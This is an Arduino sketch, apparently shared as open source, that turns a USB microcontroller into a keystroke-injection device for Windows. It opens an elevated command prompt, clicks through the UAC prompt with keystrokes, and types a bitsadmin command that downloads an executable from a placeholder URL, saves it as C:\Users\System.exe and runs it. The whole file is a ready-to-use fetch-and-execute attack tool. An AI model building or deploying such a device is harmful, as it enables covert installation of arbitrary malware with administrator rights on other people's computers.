#include <Keyboard.h>
#include <HID.h>
/* This code was created free and open-source by User1391
 *  Thank you for using this code, and for sharing with others
 */
void typeKey(int key){
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}
void setup() {
  
  delay(2500);
  Keyboard.begin();
  
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd");
  delay(1000);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(1000);
  Keyboard.press(KEY_F10);
  Keyboard.releaseAll();
  Keyboard.press(KEY_DOWN_ARROW);
  delay(1000);
  Keyboard.releaseAll();
  delay(100);
  typeKey(KEY_RETURN);
  delay(2500);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(10);
  Keyboard.releaseAll();
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("bitsadmin  /transfer mydownloadjob  /download  /priority normal URL_OF_EXE  C:\\Users\\System.exe");
  delay(100);
  typeKey(KEY_RETURN);
  delay(15000);
  Keyboard.print("cd ..\\..\\Users");
  delay(10);
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("System.exe");
  delay(100);
  typeKey(KEY_RETURN);
  
 
}

void loop() {
}
